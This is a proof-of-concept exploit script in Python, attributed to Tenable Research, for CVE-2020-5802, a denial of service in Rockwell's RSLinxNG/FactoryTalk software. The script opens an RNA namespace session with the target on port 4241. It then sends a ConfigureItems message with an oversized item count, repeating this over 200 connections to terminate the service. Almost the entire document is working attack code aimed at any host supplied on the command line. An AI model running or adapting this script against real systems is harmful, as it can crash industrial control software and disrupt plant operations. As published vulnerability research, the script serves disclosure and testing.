##
# Exploit Title: ConfigureItems Denial of Service
# Date: 12/28/2020
# Exploit Author: Tenable Research
# CVE : CVE-2020-5802
# Advisory: https://www.tenable.com/security/research/tra-2020-71
##

import sys, socket, argparse, struct
import re, random, hexdump

def block(data, pad=False):
  dlen = len(data)
  if (pad and dlen % 4):
    data += b'\x00' * (4 - dlen % 4)
  return struct.pack('<L', len(data))  + data

def rna_msg(hdr, data):
  header = ''
  for k, v in sorted(hdr.items()):
    if v is None: v = ''
    header += '{}={}\x00'.format(k, v)

  msg = b'rna\xF2' + block(header.encode(), True) + block(data)
  return msg


def dump(title, data):
  print('[--- %s ---]' % (title))
  hexdump.hexdump(data)


# MAIN
# 
descr  = 'This script attempts to terminate RSLinxNG.exe.'
 
parser = argparse.ArgumentParser(description=descr)
parser.add_argument('host', help='Target host')
parser.add_argument('-p', '--port', type=int, default=4241, help='Target port, default: %(default)s')

args = parser.parse_args()
host      = args.host
port      = args.port

hdr = {}
hdr['command'] = 'XmlCommand'
hdr['transid'] = 1
hdr['session-id'] = None

nspath = 'RNA://$Global/SomeApp/SomeServer';
data  = '\r\n<OpenNamespace xmlns="http://FactoryTalk.net/schemas/LiveData/server/2" '
data += 'namespacePath="' + nspath 
data += '" leaseTime="300" clientMachineInfo="localhost" securityToken="Token">'
data += '\r\n<requestService>http://FactoryTalk.net/schemas/LiveData/server/NamespaceBrowse/1</requestService>'
data += '\r\n<requestService>http://FactoryTalk.net/schemas/LiveData/server/Configuration/1</requestService></OpenNamespace>\x00'
open_namespace = rna_msg(hdr, data.encode())
#dump('OpenNamespace', open_namespace)

for i in range(200):
  print('Making connection %04d...' % (i + 1))
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect((host, port))
  print('Sending attack packets...')
  try:
    s.sendall(open_namespace)
    res = s.recv(4096)
    #dump('OpenNampespaceResponse', res)
    m = re.match(b'rna\xF2.*session-id=(\d+).*', res, re.DOTALL)
    if m is None:
      s.close()
      sys.exit('Failed to get a sessiond id.') 

    sid = int(m.group(1))
    hdr['transid'] = 2 
    hdr['session-id'] = sid 
    shortcut = 'SomeDeviceShortcut'
    data  = '\r\n<ConfigureItems>\r\n'
    data += '<openItems count="1073741812">\r\n'
    data += '<openItem itemId="[' + shortcut + ']@DPVersion" '
    data += 'sampleRate="250" sampleDepth="1" active="false" />'
    data += '</openItems></ConfigureItems>\x00'
    config_items = rna_msg(hdr, data.encode())
    #dump('ConigureItems', config_items)
    s.sendall(config_items)
    s.recv(4096)
  except: 
    pass
  s.close()
